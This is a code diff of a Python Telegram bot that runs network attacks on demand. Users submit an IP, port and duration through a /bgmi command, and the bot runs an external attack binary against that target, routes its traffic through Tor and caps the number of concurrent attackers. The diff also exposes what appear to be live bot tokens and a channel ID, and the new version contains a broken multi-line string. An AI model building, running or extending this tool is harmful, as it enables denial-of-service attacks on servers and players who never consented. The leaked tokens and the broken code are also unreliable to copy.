@@ -1,34 +1,23 @@
-# === SOCKS5 Proxy Setup ===
+# === SOCKS5 Proxy Setup for Tor ===
 import requests
 from telebot import apihelper
 
-# Use SOCKS5 proxy (Tor)
 proxies = {
-    'http': 'socks5h://127.0.0.1:9052',
-    'https': 'socks5h://127.0.0.1:9052'
+    'http': 'socks5h://127.0.0.1:9050',
+    'https': 'socks5h://127.0.0.1:9050'
 }
 apihelper.proxy = proxies
 
-# Optional: Proxy test at bot start
-try:
-    r = requests.get('https://check.torproject.org', proxies=proxies, timeout=10)
-    print("[Proxy Test] Status Code:", r.status_code)
-    if "Congratulations" in r.text:
-        print("[Proxy Test] Successfully routed through Tor!")
-except Exception as e:
-    print("[Proxy Test] Proxy error:", e)
-
-import os
 import telebot
 import logging
 import asyncio
 from datetime import datetime, timedelta, timezone
 
-# Initialize logging
+# Logging
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
-# Telegram bot token and channel ID
-TOKEN = '7848878988:AAEyreEyvBu2Gjf1E_I2Or_IZpJbrZnJpM8'
+# Bot token and channel ID
+TOKEN = '7848878988:AAFTJ3MezVw2zDcJVytY6tLySNEHOqGnNg4'
 CHANNEL_ID = '-1002678249799'
 bot = telebot.TeleBot(TOKEN)
 
@@ -87,7 +76,7 @@ def bgmi_command(message):
         if datetime.now() < ban_expiry:
             remaining_ban_time = (ban_expiry - datetime.now()).total_seconds()
             minutes, seconds = divmod(remaining_ban_time, 60)
-            bot.send_message(message.chat.id, f"‼️You are banned. Please wait {int(minutes)}m {int(seconds)}s.‼️\n\n REASON : NOT PROVIDING SCREENSHOT 🫣")
+            bot.send_message(message.chat.id, f"🫣You are banned. Please wait {int(minutes)}m {int(seconds)}s \n\n REASON : NOT PROVING SCREENSHOT.")
             return
         else:
             del user_bans[user_id]
@@ -107,37 +96,37 @@ def bgmi_command(message):
 
         if user_attacks[user_id] > 0 and not user_photos.get(user_id, False):
             user_bans[user_id] = datetime.now() + BAN_DURATION
-            bot.send_message(message.chat.id, "😈Feedback not received. Banned for 1 minute.")
+            bot.send_message(message.chat.id, "‼️Feedback not received. Banned for 1 minute.")
             return
 
     try:
         args = message.text.split()[1:]
         if len(args) != 3:
-            raise ValueError("┊★ȺŁØNɆ☂࿐ꔪ┊™ BOT ACTIVE!\n"
-                 "⚙️Please use the format: /bgmi <ip> <port> <duration>")
+            raise ValueError(" ┊★ȺŁØNɆ☂࿐ꔪ┊™ Bot Active✅!
 
+Usage format: /bgmi <ip> <port> <duration>")
 
         ip, port, dur = args
         if not is_valid_ip(ip): raise ValueError("Invalid IP.")
         if not is_valid_port(port): raise ValueError("Invalid port.")
         if not is_valid_duration(dur): raise ValueError("Invalid duration.")
-        if int(dur) > 240: raise ValueError("⛔Max duration is 240s limit reached, please reduce it to perform attack.")
+        if int(dur) > 240: raise ValueError("Max duration is 240s.")
 
         if user_id not in EXEMPTED_USERS:
             user_attacks[user_id] += 1
             user_photos[user_id] = False
             user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)
 
-        bot.send_message(message.chat.id, f"""Attack started 🚀 
+        bot.send_message(message.chat.id, f"""Attack started🚀
 
-REQUESTED IP: {ip}
-REQUESTED Port: {port}
-REQUESTED Time: {dur}s
+IP: {ip}
+Port: {port}
+Time: {dur}s
 
 📸Send feedback (a photo) once done!""")
 
         if user_id not in EXEMPTED_USERS and len(active_attackers) >= 3 and user_id not in active_attackers:
-            bot.send_message(message.chat.id, "❣️Currently 3 users are attacking. Please wait.")
+            bot.send_message(message.chat.id, "❣️Currently 3 users are attacking. Please wait one of them to complete.")
             return
         active_attackers.add(user_id)
 
@@ -151,7 +140,7 @@ async def run_attack_command_async(ip, port, duration, user_duration, user_name,
         command = f"./fuck {ip} {port} {duration}"
         process = await asyncio.create_subprocess_shell(command)
         await process.communicate()
-        bot.send_message(CHANNEL_ID, f"""Attack Finished
+        bot.send_message(CHANNEL_ID, f"""Attack Finished 😈
 
 IP: {ip}
 Port: {port}
